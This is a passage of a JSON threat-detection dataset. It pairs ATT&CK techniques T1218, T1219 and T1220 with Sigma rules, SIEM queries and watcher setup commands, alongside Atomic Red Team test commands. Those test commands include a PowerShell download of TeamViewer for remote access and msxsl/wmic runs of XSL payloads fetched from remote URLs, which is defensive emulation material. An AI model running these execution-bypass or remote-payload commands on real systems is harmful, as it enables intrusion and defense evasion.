'^(?:.*(?:.*(?:.*(?=.*.*\\\\odbcconf\\\\.exe)(?=.*(?:.*.*-f.*|.*.*regsvr.*)))|.*(?:.*(?=.*.*\\\\odbcconf\\\\.exe)(?=.*.*\\\\rundll32\\\\.exe))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: OpenWith.exe executes specified binary\nid: cec8e918-30f7-4e2d-9bfa-a59cc97ae60f\nstatus: experimental\ndescription: The OpenWith.exe executes other binary\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OSBinaries/Openwith.yml\n    - https://twitter.com/harr0ey/status/991670870384021504\nauthor: Beyu Denis, oscd.community (rule), @harr0ey (idea)\ndate: 2019/10/12\nmodified: 2019/11/04\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1218\nlevel: high\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\OpenWith.exe'\n        CommandLine|contains: '/c'\n    condition: selection\nfalsepositives:\n    - Legitimate use of OpenWith.exe by legitimate user", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: OpenWith.exe executes specified binary\nid: cec8e918-30f7-4e2d-9bfa-a59cc97ae60f\nstatus: experimental\ndescription: The OpenWith.exe executes other binary\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OSBinaries/Openwith.yml\n    - https://twitter.com/harr0ey/status/991670870384021504\nauthor: Beyu Denis, oscd.community (rule), @harr0ey (idea)\ndate: 2019/10/12\nmodified: 2019/11/04\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1218\nlevel: high\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\OpenWith.exe'\n        CommandLine|contains: '/c'\n    condition: selection\nfalsepositives:\n    - Legitimate use of OpenWith.exe by legitimate user", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:*\\\\\\\\OpenWith.exe AND CommandLine.keyword:*\\\\/c*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/OpenWith.exe-executes-specified-binary <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"OpenWith.exe executes specified binary\",\\n    \"description\": \"The OpenWith.exe executes other binary\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.execution\",\\n      \"attack.t1218\"\\n    ],\\n    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\OpenWith.exe AND CommandLine.keyword:*\\\\\\\\/c*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\OpenWith.exe AND CommandLine.keyword:*\\\\\\\\/c*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'OpenWith.exe executes specified binary\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:*\\\\\\\\OpenWith.exe AND CommandLine.keyword:*\\\\/c*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\OpenWith.exe\" CommandLine=\"*/c*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"*\\\\\\\\OpenWith.exe\" CommandLine=\"*/c*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\OpenWith\\\\.exe)(?=.*.*/c.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: psr.exe capture screenshots\nid: 2158f96f-43c2-43cb-952a-ab4580f32382\nstatus: experimental\ndescription: The psr.exe captures desktop screenshots and saves them on the local machine\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OSBinaries/Psr.yml\n    - https://www.sans.org/summit-archives/file/summit-archive-1493861893.pdf\nauthor: Beyu Denis, oscd.community\ndate: 2019/10/12\nmodified: 2019/11/04\ntags:\n    - attack.persistence\n    - attack.t1218\nlevel: medium\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\Psr.exe'\n        CommandLine|contains: '/start'\n    condition: selection \nfalsepositives:\n    - Unknown", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: psr.exe capture screenshots\nid: 2158f96f-43c2-43cb-952a-ab4580f32382\nstatus: experimental\ndescription: The psr.exe captures desktop screenshots and saves them on the local machine\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OSBinaries/Psr.yml\n    - https://www.sans.org/summit-archives/file/summit-archive-1493861893.pdf\nauthor: Beyu Denis, oscd.community\ndate: 2019/10/12\nmodified: 2019/11/04\ntags:\n    - attack.persistence\n    - attack.t1218\nlevel: medium\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\Psr.exe'\n        CommandLine|contains: '/start'\n    condition: selection \nfalsepositives:\n    - Unknown", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:*\\\\\\\\Psr.exe AND CommandLine.keyword:*\\\\/start*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/psr.exe-capture-screenshots <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"psr.exe capture screenshots\",\\n    \"description\": \"The psr.exe captures desktop screenshots and saves them on the local machine\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.t1218\"\\n    ],\\n    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\Psr.exe AND CommandLine.keyword:*\\\\\\\\/start*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\Psr.exe AND CommandLine.keyword:*\\\\\\\\/start*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'psr.exe capture screenshots\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:*\\\\\\\\Psr.exe AND CommandLine.keyword:*\\\\/start*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\Psr.exe\" CommandLine=\"*/start*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"*\\\\\\\\Psr.exe\" CommandLine=\"*/start*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\Psr\\\\.exe)(?=.*.*/start.*))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1219/T1219.yaml", "command": "$client = new-object System.Net.WebClient\n$client.DownloadFile(\"https://download.teamviewer.com/download/TeamViewer_Setup.exe\",\"C:\\tmp\\teamviewer.exe\")\n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/vnc", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/vnc", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/management/osx/screen_sharing", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/management/osx/screen_sharing", "name": "Empire Module Command"}], "command_list": ["$client = new-object System.Net.WebClient\n$client.DownloadFile(\"https://download.teamviewer.com/download/TeamViewer_Setup.exe\",\"C:\\tmp\\teamviewer.exe\")\n", "powershell/management/vnc", "powershell/management/vnc", "python/management/osx/screen_sharing", "python/management/osx/screen_sharing"], "technique_id": "T1219", "parsed_datasets": [{"Atomic Red Team Test - Remote Access Tools": {"display_name": "Remote Access Tools", "atomic_tests": [{"description": "An adversary may attempt to trick the user into downloading teamviewer and using  this to maintain access to the machine. \n", "supported_platforms": ["windows"], "name": "TeamViewer Files Detected Test on Windows", "executor": {"elevation_required": false, "command": "$client = new-object System.Net.WebClient\n$client.DownloadFile(\"https://download.teamviewer.com/download/TeamViewer_Setup.exe\",\"C:\\tmp\\teamviewer.exe\")\n", "name": "powershell"}}], "attack_technique": "T1219"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1219", "Empire Module": "powershell/management/vnc", "Technique": "Remote Access Tools", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/management/vnc\":  [\"T1219\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1219", "Empire Module": "python/management/osx/screen_sharing", "Technique": "Remote Access Tools", "ATT&CK Technique #2": "T1021", "Concatenate for Python Dictionary": "\"python/management/osx/screen_sharing\":  [\"T1219\",\"T1021\"],"}}], "queries": [{"query": "title: Antivirus Exploitation Framework Detection\nid: 238527ad-3c2c-4e4f-a1f6-92fd63adb864\ndescription: Detects a highly relevant Antivirus alert that reports an exploitation framework\ndate: 2018/09/09\nmodified: 2019/01/16\nauthor: Florian Roth\nreferences:\n    - https://www.nextron-systems.com/2018/09/08/antivirus-event-analysis-cheat-sheet-v1-4/\ntags:\n    - attack.execution\n    - attack.t1203\n    - attack.command_and_control\n    - attack.t1219\nlogsource:\n    product: antivirus\ndetection:\n    selection:\n        Signature: \n            - \"*MeteTool*\"\n            - \"*MPreter*\"\n            - \"*Meterpreter*\"\n            - \"*Metasploit*\"\n            - \"*PowerSploit*\"\n            - \"*CobaltSrike*\"\n            - \"*Swrort*\"\n            - \"*Rozena*\"\n            - '*Backdoor.Cobalt*'\n    condition: selection\nfields:\n    - FileName\n    - User\nfalsepositives:\n    - Unlikely\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Antivirus Exploitation Framework Detection\nid: 238527ad-3c2c-4e4f-a1f6-92fd63adb864\ndescription: Detects a highly relevant Antivirus alert that reports an exploitation framework\ndate: 2018/09/09\nmodified: 2019/01/16\nauthor: Florian Roth\nreferences:\n    - https://www.nextron-systems.com/2018/09/08/antivirus-event-analysis-cheat-sheet-v1-4/\ntags:\n    - attack.execution\n    - attack.t1203\n    - attack.command_and_control\n    - attack.t1219\nlogsource:\n    product: antivirus\ndetection:\n    selection:\n        Signature: \n            - \"*MeteTool*\"\n            - \"*MPreter*\"\n            - \"*Meterpreter*\"\n            - \"*Metasploit*\"\n            - \"*PowerSploit*\"\n            - \"*CobaltSrike*\"\n            - \"*Swrort*\"\n            - \"*Rozena*\"\n            - '*Backdoor.Cobalt*'\n    condition: selection\nfields:\n    - FileName\n    - User\nfalsepositives:\n    - Unlikely\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "Signature.keyword:(*MeteTool* OR *MPreter* OR *Meterpreter* OR *Metasploit* OR *PowerSploit* OR *CobaltSrike* OR *Swrort* OR *Rozena* OR *Backdoor.Cobalt*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Antivirus-Exploitation-Framework-Detection <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Antivirus Exploitation Framework Detection\",\\n    \"description\": \"Detects a highly relevant Antivirus alert that reports an exploitation framework\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1203\",\\n      \"attack.command_and_control\",\\n      \"attack.t1219\"\\n    ],\\n    \"query\": \"Signature.keyword:(*MeteTool* OR *MPreter* OR *Meterpreter* OR *Metasploit* OR *PowerSploit* OR *CobaltSrike* OR *Swrort* OR *Rozena* OR *Backdoor.Cobalt*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"Signature.keyword:(*MeteTool* OR *MPreter* OR *Meterpreter* OR *Metasploit* OR *PowerSploit* OR *CobaltSrike* OR *Swrort* OR *Rozena* OR *Backdoor.Cobalt*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Antivirus Exploitation Framework Detection\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\nFileName = {{_source.FileName}}\\\\n    User = {{_source.User}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "Signature.keyword:(*MeteTool* *MPreter* *Meterpreter* *Metasploit* *PowerSploit* *CobaltSrike* *Swrort* *Rozena* *Backdoor.Cobalt*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Signature=\"*MeteTool*\" OR Signature=\"*MPreter*\" OR Signature=\"*Meterpreter*\" OR Signature=\"*Metasploit*\" OR Signature=\"*PowerSploit*\" OR Signature=\"*CobaltSrike*\" OR Signature=\"*Swrort*\" OR Signature=\"*Rozena*\" OR Signature=\"*Backdoor.Cobalt*\") | table FileName,User", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "Signature IN [\"*MeteTool*\", \"*MPreter*\", \"*Meterpreter*\", \"*Metasploit*\", \"*PowerSploit*\", \"*CobaltSrike*\", \"*Swrort*\", \"*Rozena*\", \"*Backdoor.Cobalt*\"]", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.*MeteTool.*|.*.*MPreter.*|.*.*Meterpreter.*|.*.*Metasploit.*|.*.*PowerSploit.*|.*.*CobaltSrike.*|.*.*Swrort.*|.*.*Rozena.*|.*.*Backdoor\\\\.Cobalt.*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious TSCON Start\nid: 9847f263-4a81-424f-970c-875dab15b79b\nstatus: experimental\ndescription: Detects a tscon.exe start as LOCAL SYSTEM\nreferences:\n    - http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html\n    - https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6\nauthor: Florian Roth\ndate: 2018/03/17\ntags:\n    - attack.command_and_control\n    - attack.t1219\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        User: NT AUTHORITY\\SYSTEM\n        Image: '*\\tscon.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious TSCON Start\nid: 9847f263-4a81-424f-970c-875dab15b79b\nstatus: experimental\ndescription: Detects a tscon.exe start as LOCAL SYSTEM\nreferences:\n    - http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html\n    - https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6\nauthor: Florian Roth\ndate: 2018/03/17\ntags:\n    - attack.command_and_control\n    - attack.t1219\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        User: NT AUTHORITY\\SYSTEM\n        Image: '*\\tscon.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(User:\"NT\\\\ AUTHORITY\\\\\\\\SYSTEM\" AND Image.keyword:*\\\\\\\\tscon.exe)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-TSCON-Start <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious TSCON Start\",\\n    \"description\": \"Detects a tscon.exe start as LOCAL SYSTEM\",\\n    \"tags\": [\\n      \"attack.command_and_control\",\\n      \"attack.t1219\"\\n    ],\\n    \"query\": \"(User:\\\\\"NT\\\\\\\\ AUTHORITY\\\\\\\\\\\\\\\\SYSTEM\\\\\" AND Image.keyword:*\\\\\\\\\\\\\\\\tscon.exe)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(User:\\\\\"NT\\\\\\\\ AUTHORITY\\\\\\\\\\\\\\\\SYSTEM\\\\\" AND Image.keyword:*\\\\\\\\\\\\\\\\tscon.exe)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious TSCON Start\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(User:\"NT AUTHORITY\\\\\\\\SYSTEM\" AND Image.keyword:*\\\\\\\\tscon.exe)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(User=\"NT AUTHORITY\\\\\\\\SYSTEM\" Image=\"*\\\\\\\\tscon.exe\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" User=\"NT AUTHORITY\\\\\\\\SYSTEM\" Image=\"*\\\\\\\\tscon.exe\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*NT AUTHORITY\\\\SYSTEM)(?=.*.*\\\\tscon\\\\.exe))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1220/T1220.yaml", "command": "C:\\Windows\\Temp\\msxsl.exe PathToAtomicsFolder\\T1220\\src\\msxslxmlfile.xml #{xslfile}\n", "name": null}, {"source": "atomics/T1220/T1220.yaml", "command": "C:\\Windows\\Temp\\msxsl.exe PathToAtomicsFolder\\T1220\\src\\msxslxmlfile.xml PathToAtomicsFolder\\T1220\\src\\msxslscript.xsl\n", "name": null}, {"source": "atomics/T1220/T1220.yaml", "command": "C:\\Windows\\Temp\\msxsl.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml #{xslfile}\n", "name": null}, {"source": "atomics/T1220/T1220.yaml", "command": "C:\\Windows\\Temp\\msxsl.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl\n", "name": null}, {"source": "atomics/T1220/T1220.yaml", "command": "wmic.exe #{wmic_command} /FORMAT:PathToAtomicsFolder\\T1220\\src\\wmicscript.xsl\n", "name": null}, {"source": "atomics/T1220/T1220.yaml", "command": "wmic.exe process list /FORMAT:PathToAtomicsFolder\\T1220\\src\\wmicscript.xsl\n", "name": null}, {"source": "atomics/T1220/T1220.yaml", "command": "wmic.exe #{wmic_command} /FORMAT:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl\n", "name": null}, {"source": "atomics/T1220/T1220.yaml", "command": "wmic.exe process list /FORMAT:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl\n", "name": null}, {"source": "SysmonHunter - XSL Script Processing", "command": "msxsl.exe", "name": null}, {"source": "SysmonHunter - XSL Script Processing", "command": "process|list|/FORMAT|.xslwmic.exe", "name": null}, {"source": "SysmonHunter - XSL Script Processing", "command": "os|get|/FORMAT|.xslwmic.exe", "name": null}], "command_list": ["C:\\Windows\\Temp\\msxsl.exe PathToAtomicsFolder\\T1220\\src\\msxslxmlfile.xml #{xslfile}\n", "C:\\Windows\\Temp\\msxsl.exe PathToAtomicsFolder\\T1220\\src\\msxslxmlfile.xml PathToAtomicsFolder\\T1220\\src\\msxslscript.xsl\n", "C:\\Windows\\Temp\\msxsl.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml #{xslfile}\n", "C:\\Windows\\Temp\\msxsl.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl\n", "wmic.exe #{wmic_command} /FORMAT:PathToAtomicsFolder\\T1220\\src\\wmicscript.xsl\n", "wmic.exe process list /FORMAT:PathToAtomicsFolder\\T1220\\src\\wmicscript.xsl\n", "wmic.exe #{wmic_command} /FORMAT:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl\n", "wmic.exe process list /FORMAT:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl\n", "msxsl.exe", "process|list|/FORMAT|.xslwmic.exe", "os|get|/FORMAT|.xslwmic.exe"], "technique_id": "T1220", "parsed_datasets": [{"Atomic Red Team Test - XSL Script Processing": {"display_name": "XSL Script Processing", "atomic_tests": [{"dependencies": [{"description": "XML file must exist on disk at specified location (#{xmlfile})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{xmlfile}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslxmlfile.xml\" -OutFile \"#{xmlfile}\"\n", "prereq_command": "if (Test-Path #{xmlfile}) {exit 0} else {exit 1}\n"}, {"description": "XSL file must exist on disk at specified location (#{xslfile})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{xslfile}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslscript.xsl\" -OutFile \"#{xslfile}\"\n", "prereq_command": "if (Test-Path #{xslfile}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "MSXSL Bypass using local files", "executor": {"command": "C:\\Windows\\Temp\\msxsl.exe #{xmlfile} #{xslfile}\n", "name": "command_prompt"}, "description": "Executes the code specified within a XSL script tag during XSL transformation using a local payload. Requires download of MSXSL from Microsoft at https://www.microsoft.com/en-us/download/details.aspx?id=21714.\n", "input_arguments": {"xmlfile": {"default": "PathToAtomicsFolder\\T1220\\src\\msxslxmlfile.xml", "type": "Path", "description": "Location of the test XML file on the local filesystem."}, "xslfile": {"default": "PathToAtomicsFolder\\T1220\\src\\msxslscript.xsl", "type": "Path", "description": "Location of the test XSL script file on the local filesystem."}}, "dependency_executor_name": "powershell"}, {"description": "Executes the code specified within a XSL script tag during XSL transformation using a remote payload. Requires download of MSXSL from Microsoft at https://www.microsoft.com/en-us/download/details.aspx?id=21714.\n", "supported_platforms": ["windows"], "name": "MSXSL Bypass using remote files", "input_arguments": {"xmlfile": {"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml", "type": "Url", "description": "Remote location (URL) of the test XML file."}, "xslfile": {"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl", "type": "Url", "description": "Remote location (URL) of the test XSL script file."}}, "executor": {"command": "C:\\Windows\\Temp\\msxsl.exe #{xmlfile} #{xslfile}\n", "name": "command_prompt"}}, {"dependencies": [{"description": "XSL file must exist on disk at specified location (#{local_xsl_file})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{local_xsl_file}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/wmicscript.xsl\" -OutFile \"#{local_xsl_file}\"\n", "prereq_command": "if (Test-Path #{local_xsl_file}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "WMIC bypass using local XSL file", "executor": {"command": "wmic.exe #{wmic_command} /FORMAT:#{local_xsl_file}\n", "name": "command_prompt"}, "description": "Executes the code specified within a XSL script using a local payload.\n", "input_arguments": {"local_xsl_file": {"default": "PathToAtomicsFolder\\T1220\\src\\wmicscript.xsl", "type": "path", "description": "Location of the test XSL script file on the local filesystem."}, "wmic_command": {"default": "process list", "type": "string", "description": "WMI command to execute using wmic.exe"}}, "dependency_executor_name": "powershell"}, {"description": "Executes the code specified within a XSL script using a remote payload.\n", "supported_platforms": ["windows"], "name": "WMIC bypass using remote XSL file", "input_arguments": {"remote_xsl_file": {"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl", "type": "url", "description": "Remote location of an XSL payload."}, "wmic_command": {"default": "process list", "type": "string", "description": "WMI command to execute using wmic.exe"}}, "executor": {"command": "wmic.exe #{wmic_command} /FORMAT:#{remote_xsl_file}\n", "name": "command_prompt"}}], "attack_technique": "T1220"}}, {"SysmonHunter - T1220": {"phase": "Execution", "query": [{"process": {"any": {"pattern": "msxsl.exe"}}, "type": "process"}, {"process": {"cmdline": {"pattern": "process|list|/FORMAT|.xsl", "op": "and"}, "image": {"pattern": "wmic.exe"}}, "type": "process"}, {"process": {"cmdline": {"pattern": "os|get|/FORMAT|.xsl", "op": "and"}, "image": {"pattern": "wmic.exe"}}, "type": "process"}], "description": null, "name": "XSL Script Processing", "level": "medium"}}], "queries": [{"query": "title: XSL Script Processing\nid: 05c36dd6-79d6-4a9a-97da-3db20298ab2d\nstatus: experimental\ndescription: Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files, rule detects when adversaries\n    abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses\nauthor: Timur Zinniatullin, oscd.community\ndate: 2019/10/21\nmodified: 2019/11/04\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1220/T1220.yaml\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n      - Image|endswith: '\\wmic.exe'\n        